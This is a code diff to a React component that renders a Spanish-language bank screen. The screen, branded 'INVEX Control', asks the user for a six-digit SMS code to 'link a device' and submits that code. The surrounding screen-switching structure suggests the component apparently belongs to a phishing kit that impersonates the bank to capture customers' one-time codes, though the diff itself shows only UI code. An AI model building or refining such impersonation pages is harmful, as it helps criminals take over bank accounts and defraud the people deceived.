@@ -468,24 +468,46 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(telefonoContent);
 
       case ScreenType.CODIGO:
+        const terminacionTelefono = screenData.terminacion || '8909';
+        
         const codigoContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Verificación de seguridad</h2>
-            <p className="mb-4">
-              Hemos enviado un código de verificación a tu número de teléfono terminación: <strong>{screenData.terminacion || "****"}</strong>
+            <h2 className="text-xl font-bold mb-3">Vincular dispositivo a INVEX Control</h2>
+            <p className="mb-4 text-sm text-gray-600">
+              Ingresa el código que recibiste por SMS al número ***{terminacionTelefono} para poder vincular tu dispositivo con INVEX Control.
             </p>
-            <Input 
-              type="text" 
-              placeholder="Ingrese el código" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
-              value={codigoInput}
-              onChange={(e) => setCodigoInput(e.target.value)}
-            />
+            
+            <div className="mb-4">
+              <label className="block text-sm font-medium mb-2">Código de verificación</label>
+              <Input 
+                type="text" 
+                placeholder="000000"
+                className="w-full border border-gray-300 rounded p-3 text-center text-lg tracking-widest"
+                value={codigoInput}
+                onChange={(e) => {
+                  // Solo permitir números y limitar a 6 dígitos
+                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                  setCodigoInput(value);
+                }}
+                maxLength={6}
+              />
+              <p className="text-xs text-gray-500 mt-1">
+                Código de 6 dígitos enviado por SMS
+              </p>
+            </div>
+            
             <Button 
-              className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              onClick={() => {
+                if (codigoInput.length === 6) {
+                  onSubmit(ScreenType.CODIGO, { codigo: codigoInput });
+                } else {
+                  alert('Por favor ingresa el código completo de 6 dígitos');
+                }
+              }}
+              disabled={codigoInput.length !== 6}
             >
-              Verificar
+              Verificar código
             </Button>
           </>
         );
